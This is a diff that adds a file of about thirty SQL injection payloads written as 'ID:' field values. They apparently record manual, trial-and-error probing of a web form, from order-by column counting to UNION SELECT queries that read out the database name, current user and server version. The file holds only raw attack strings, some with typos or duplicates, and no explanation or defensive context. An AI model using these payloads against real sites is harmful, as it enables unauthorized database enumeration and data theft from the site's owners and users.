@@ -1,0 +1,29 @@
+ID:1'order by 2-- -
+ID:1'order by 3-- -
+ID:1'order by 4-- -
+ID:1'order by 5-- -
+ID:1'order by 3-- -
+ID:1'union select 1,2,3-- -
+ID:1'union select 1,2,3,4-- -
+ID:1'union select 1,2,3,-- -
+ID:1'union select 1,2,3-- -
+ID:1'union select database,2,3-- -
+ID:1'union select database(),2,3-- -
+ID:1'union select database(),current_user,3-- -
+ID:1'union select database(),current_user,version-- -
+ID:1'union select database(),current_user,version()-- -
+ID:1'union select concat(database(),current_user,version()),2,3-- -
+ID:1'union select concat(database(),current_user,version()),2,3-- -
+ID:-1'union select concat(database(),current_user,version()),2,3-- -
+ID:-1'union select concat(database(),current_user,version()),2,3-- -
+ID:-1'union select concat(database(),current_user,version()),2,3-- -
+ID:-1'union select concat(database(),current_user,version()),2,version()-- -
+ID:-1'union select concat(database(),current_user,version()),version(),version()-- -
+ID:-1'union select concat(database(),current_user,version()),versiodn(),version()-- -
+ID:-1'union select concat(database(),current_user,version()),version(),version()-- -
+ID:-1'union select concat(database(),current_user,version()),version(),version()-- -
+ID:-1'union all select concat(database(),current_user,version()),version(),version()-- -
+ID:-1'union all select concat(database(),current_user,version()),version(),version()-- -
+ID:-1'union all select concat(database(),current_user,version()),version(),version()
+ID:-1'union all select concat(database(),current_user,version()),version(),version()--
+ID:-1'union all select concat(database(),current_user,version()),version(),version()-- -
